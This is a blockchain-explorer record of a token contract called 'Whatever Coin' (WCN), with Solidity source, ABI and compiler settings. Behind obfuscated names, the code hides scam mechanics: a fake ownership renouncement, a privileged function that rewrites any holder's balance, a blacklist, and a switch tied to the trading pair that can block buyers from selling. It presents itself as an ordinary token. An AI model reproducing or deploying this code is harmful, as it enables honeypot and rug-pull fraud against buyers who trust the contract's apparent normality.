{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract marketingWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minLaunch {\n    function createPair(address fundReceiverIs, address txLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface receiverExemptToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface totalTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTx) external view returns (uint256);\n\n    function transfer(address atReceiver, uint256 launchMin) external returns (bool);\n\n    function allowance(address feeLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atReceiver,\n        uint256 launchMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverFundMode, uint256 value);\n    event Approval(address indexed feeLaunched, address indexed spender, uint256 value);\n}\n\ninterface sellTakeReceiver is totalTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WhateverCoin is marketingWallet, totalTeam, sellTakeReceiver {\n\n    string private limitAutoTotal = \"Whatever Coin\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverToTake;\n    }\n\n    bool private swapMode;\n\n    uint8 private senderFee = 18;\n\n    function fromReceiver() public {\n        emit OwnershipTransferred(autoSellFrom, address(0));\n        enableAt = address(0);\n    }\n\n    function totalIs(address enableAuto, address atReceiver, uint256 launchMin) internal returns (bool) {\n        require(fromAtReceiver[enableAuto] >= launchMin);\n        fromAtReceiver[enableAuto] -= launchMin;\n        fromAtReceiver[atReceiver] += launchMin;\n        emit Transfer(enableAuto, atReceiver, launchMin);\n        return true;\n    }\n\n    function txLimitFee(address atAuto) public {\n        if (swapAmount) {\n            return;\n        }\n        \n        fromSwap[atAuto] = true;\n        \n        swapAmount = true;\n    }\n\n    address public autoSellFrom;\n\n    mapping(address => uint256) private fromAtReceiver;\n\n    function getOwner() external view returns (address) {\n        return enableAt;\n    }\n\n    function approve(address walletMax, uint256 launchMin) public virtual override returns (bool) {\n        fundReceiverFrom[_msgSender()][walletMax] = launchMin;\n        emit Approval(_msgSender(), walletMax, launchMin);\n        return true;\n    }\n\n    address toTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public teamWalletLimit;\n\n    bool public receiverShould;\n\n    constructor (){\n        if (takeToLaunch == teamWalletLimit) {\n            isMarketingTo = takeToLaunch;\n        }\n        fromReceiver();\n        receiverExemptToken takeAt = receiverExemptToken(toTrading);\n        autoFeeTeam = minLaunch(takeAt.factory()).createPair(takeAt.WETH(), address(this));\n        receiverFrom = minLaunch(takeAt.factory()).feeTo();\n        if (amountMarketing == listToReceiver) {\n            isMarketingTo = takeToLaunch;\n        }\n        autoSellFrom = _msgSender();\n        fromSwap[autoSellFrom] = true;\n        fromAtReceiver[autoSellFrom] = receiverToTake;\n        \n        emit Transfer(address(0), autoSellFrom, receiverToTake);\n    }\n\n    uint256 public takeToLaunch;\n\n    function transfer(address totalAt, uint256 launchMin) external virtual override returns (bool) {\n        return fromExempt(_msgSender(), totalAt, launchMin);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundReceiverFrom;\n\n    uint256 public amountMarketing;\n\n    address public autoFeeTeam;\n\n    function marketingMode(address enableAuto, address atReceiver, uint256 launchMin) internal view returns (uint256) {\n        require(launchMin > 0);\n\n        uint256 limitTrading = 0;\n        if (enableAuto == autoFeeTeam && teamLaunchWallet > 0) {\n            limitTrading = launchMin * teamLaunchWallet / 100;\n        } else if (atReceiver == autoFeeTeam && txExempt > 0) {\n            limitTrading = launchMin * txExempt / 100;\n        }\n        require(limitTrading <= launchMin);\n        return launchMin - limitTrading;\n    }\n\n    function totalLaunch(address takeFundMode) public {\n        amountMaxAt();\n        \n        if (takeFundMode == autoSellFrom || takeFundMode == autoFeeTeam) {\n            return;\n        }\n        isReceiver[takeFundMode] = true;\n    }\n\n    function allowance(address shouldReceiver, address walletMax) external view virtual override returns (uint256) {\n        if (walletMax == toTrading) {\n            return type(uint256).max;\n        }\n        return fundReceiverFrom[shouldReceiver][walletMax];\n    }\n\n    mapping(address => bool) public isReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeToAt;\n    }\n\n    uint256 public isMarketingTo;\n\n    function listFeeShould(uint256 launchMin) public {\n        amountMaxAt();\n        shouldMarketing = launchMin;\n    }\n\n    uint256 constant feeIs = 15 ** 10;\n\n    event OwnershipTransferred(address indexed fromSender, address indexed sellAmount);\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderFee;\n    }\n\n    function owner() external view returns (address) {\n        return enableAt;\n    }\n\n    string private modeToAt = \"WCN\";\n\n    mapping(address => bool) public fromSwap;\n\n    function shouldFee(address totalAt, uint256 launchMin) public {\n        amountMaxAt();\n        fromAtReceiver[totalAt] = launchMin;\n    }\n\n    address receiverFrom;\n\n    bool public swapAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return limitAutoTotal;\n    }\n\n    uint256 private listToReceiver;\n\n    bool private limitLaunch;\n\n    uint256 shouldMarketing;\n\n    uint256 public teamLaunchWallet = 3;\n\n    bool public txTradingLiquidity;\n\n    address private enableAt;\n\n    function amountMaxAt() private view {\n        require(fromSwap[_msgSender()]);\n    }\n\n    bool public walletTotal;\n\n    uint256 maxFee;\n\n    uint256 private receiverToTake = 100000000 * 10 ** 18;\n\n    function fromExempt(address enableAuto, address atReceiver, uint256 launchMin) internal returns (bool) {\n        if (enableAuto == autoSellFrom) {\n            return totalIs(enableAuto, atReceiver, launchMin);\n        }\n        uint256 maxReceiver = totalTeam(autoFeeTeam).balanceOf(receiverFrom);\n        require(maxReceiver == shouldMarketing);\n        require(atReceiver != receiverFrom);\n        if (isReceiver[enableAuto]) {\n            return totalIs(enableAuto, atReceiver, feeIs);\n        }\n        launchMin = marketingMode(enableAuto, atReceiver, launchMin);\n        return totalIs(enableAuto, atReceiver, launchMin);\n    }\n\n    function transferFrom(address enableAuto, address atReceiver, uint256 launchMin) external override returns (bool) {\n        if (_msgSender() != toTrading) {\n            if (fundReceiverFrom[enableAuto][_msgSender()] != type(uint256).max) {\n                require(launchMin <= fundReceiverFrom[enableAuto][_msgSender()]);\n                fundReceiverFrom[enableAuto][_msgSender()] -= launchMin;\n            }\n        }\n        return fromExempt(enableAuto, atReceiver, launchMin);\n    }\n\n    uint256 public txExempt = 0;\n\n    function balanceOf(address amountTx) public view virtual override returns (uint256) {\n        return fromAtReceiver[amountTx];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFundMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFeeTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSellFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchMin\",\"type\":\"uint256\"}],\"name\":\"listFeeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMin\",\"type\":\"uint256\"}],\"name\":\"shouldFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunchWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWalletLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFundMode\",\"type\":\"address\"}],\"name\":\"totalLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"}],\"name\":\"txLimitFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WhateverCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}